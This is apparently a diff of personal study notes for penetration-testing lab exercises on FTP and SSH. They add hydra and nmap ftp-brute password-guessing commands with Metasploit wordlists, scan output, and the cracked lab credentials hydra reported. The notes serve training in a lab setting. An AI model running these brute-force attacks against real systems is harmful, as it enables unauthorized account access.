@@ -105,7 +105,7 @@ How do we exploit this vulnerability in metasploit?
 - check is anonymous access if possible via nmap script 
 	- command to search only for nmap script for ftp: ls -al /usr/share/nmap/script/ | grep ftp-* 
 - bruteforce ftp: 
-	- hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt targetip -t 4 ftp 
+	- **hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt targetip -t 4 ftp** 
 		- This option specifies the number of parallel tasks to be executed simultaneously. In this case, it is set to 4, meaning that Hydra will attempt to crack passwords using four parallel connections
 	- start ftp and use username and password found in bruteforce attack 
 	
@@ -118,12 +118,37 @@ How do we exploit this vulnerability in metasploit?
 
 
 1. What is the version of FTP server?
+   
+   PORT   STATE SERVICE VERSION
+	21/tcp open  ftp     ProFTPD 1.3.5a
+   ![[Pasted image 20230717133020.png]]
+   
 2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
+   
+   ![[Pasted image 20230717133411.png]]
+   [21][ftp] host: 192.66.3.3   login: sysadmin   password: 654321
+[21][ftp] host: 192.66.3.3   login: rooty   password: qwerty
+[21][ftp] host: 192.66.3.3   login: demo   password: butterfly
+[STATUS] 3045.00 tries/min, 3045 tries in 00:01h, 4018 to do in 00:02h, 4 active
+[21][ftp] host: 192.66.3.3   login: auditor   password: chocolate
+[21][ftp] host: 192.66.3.3   login: anon   password: purple
+[STATUS] 2549.50 tries/min, 5099 tries in 00:02h, 1964 to do in 00:01h, 4 active
+[21][ftp] host: 192.66.3.3   login: administrator   password: tweety
+[21][ftp] host: 192.66.3.3   login: diag   password: tigger
+   
+   
 3. Find the password of user “sysadmin” using nmap script.
+   
+   first store the user in a file: echo "sysadmin" > users
+than run the following command: 
+nmap -p 21 --script ftp-brute --script-args userdb=/root/users 192.66.3.3 
+
+![[Pasted image 20230717134954.png]]
+sysadmin:654321  
+   
 4. Find seven flags hidden on the server.
 
-
-
+ get {filename}
 
 
 
@@ -155,11 +180,39 @@ How do we exploit this vulnerability in metasploit?
 	- find the flag 
 
 
+-- Lab -- 
+
+- auxiliary/scanner/ssh/ssh_version
+- auxiliary/scanner/ssh/ssh_login 
+
+22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0) 
+
+root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.9.96.3 -t 4 ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 350 login tries (l:7/p:50), ~88 tries per task
+[DATA] attacking ssh://192.9.96.3:22/
+[22][ssh] host: 192.9.96.3   login: sysadmin   password: hailey
+[STATUS] 74.00 tries/min, 74 tries in 00:01h, 276 to do in 00:04h, 4 active
+[22][ssh] host: 192.9.96.3   login: rooty   password: pineapple
+[22][ssh] host: 192.9.96.3   login: demo   password: butterfly1
+[22][ssh] host: 192.9.96.3   login: auditor   password: xbox360
+[STATUS] 69.33 tries/min, 208 tries in 00:03h, 142 to do in 00:03h, 4 active
+[STATUS] 60.75 tries/min, 243 tries in 00:04h, 107 to do in 00:02h, 4 active
+[22][ssh] host: 192.9.96.3   login: anon   password: 741852963
+[STATUS] 54.80 tries/min, 274 tries in 00:05h, 76 to do in 00:02h, 4 active
+
+[STATUS] 49.00 tries/min, 294 tries in 00:06h, 56 to do in 00:02h, 4 active
+[22][ssh] host: 192.9.96.3   login: administrator   password: password1
+[STATUS] 46.86 tries/min, 328 tries in 00:07h, 22 to do in 00:01h, 4 active
+[22][ssh] host: 192.9.96.3   login: diag   password: secret
+
+![[Pasted image 20230717141806.png]]
 
 
-
+- Use **/usr/share/metasploit-framework/data/wordlists/common_users.txt** username dictionary
+- Use **/usr/share/metasploit-framework/data/wordlists/common_passwords.txt** password dictionary
 
 
 
